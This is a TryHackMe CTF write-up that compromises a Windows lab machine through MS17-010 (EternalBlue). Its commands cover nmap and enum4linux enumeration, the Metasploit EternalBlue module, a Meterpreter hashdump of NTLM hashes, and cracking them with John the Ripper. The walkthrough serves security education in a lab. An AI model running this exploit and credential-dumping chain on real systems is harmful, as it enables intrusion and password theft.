# TryHackMe – Blue

**Completed:** *date here*  
**Platform:** TryHackMe  
> ⚠️ This write-up is for educational purposes only. All activity was conducted within legal lab environments.

This CTF focused on enumerating a Windows machine, identifying an SMB vulnerability, exploiting MS17-010 (EternalBlue), and performing post-exploitation steps including credential dumping and hash cracking to retrieve all flags.

---

## 🎯 Target: Windows Server (SMB / MS17-010)

### 🔍 Nmap Scan

```bash
nmap -sS -sV -sC -T4 <IP>
Explanation: Performs a TCP SYN scan (-sS), service version detection (-sV), and runs default NSE scripts (-sC). The -T4 flag speeds up scanning.

Result Summary:

arduino
Copy code
445/tcp open  microsoft-ds
SMB service discovered.

📡 SMB Enumeration
Enumerated SMB details using:

bash
Copy code
enum4linux -A <IP>
Explanation: Enumerates SMB shares, users, policies, and server information.

Findings:

SMBv1 supported

Host and share information discovered

Confirmed SMB as a valid attack vector

🧪 Vulnerability Scan (MS17-010)
Confirmed EternalBlue vulnerability using Nmap's NSE script:

bash
Copy code
nmap --script smb-vuln-ms17-010 -T4 <IP>
Explanation: Checks whether the SMB service is vulnerable to MS17-010 (EternalBlue).

Result: Target reported as VULNERABLE to MS17-010.

💥 Exploitation: EternalBlue
Launched Metasploit and configured the EternalBlue module:

bash
Copy code
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
run
Explanation: Executes the EternalBlue exploit, taking advantage of the SMBv1 vulnerability.

Outcome:
Gained a SYSTEM-level Meterpreter session on the Windows target.

🖥️ Post-Exploitation Enumeration
Dumped NTLM password hashes:

bash
Copy code
hashdump
Explanation: Extracts SAM database password hashes from the compromised Windows system.

Saved hashes to a file:

bash
Copy code
echo "<hashes>" > hash.txt
🔐 Password Cracking
Cracked the extracted hashes using John the Ripper:

bash
Copy code
john hash.txt --wordlist=rockyou.txt
Explanation: Attempts to recover plaintext passwords using dictionary-based attacks.

Outcome:
Recovered plaintext credentials, enabling full system access and retrieval of all flags.

🧠 Summary
Phase	Key Finding
Enumeration	SMB detected, SMBv1 supported
Vulnerability Check	MS17-010 confirmed
Exploitation	EternalBlue → SYSTEM shell
Post-Exploitation	NTLM hashes dumped & cracked
Outcome	Full compromise + all flags retrieved

💡 Lessons Learned
Enumeration with enum4linux and targeted Nmap scripts provides deep insight into SMB configuration

EternalBlue demonstrates how a single unpatched vulnerability can lead to full SYSTEM compromise

NTLM hash extraction and cracking highlight essential Windows post-exploitation techniques

yaml
Copy code
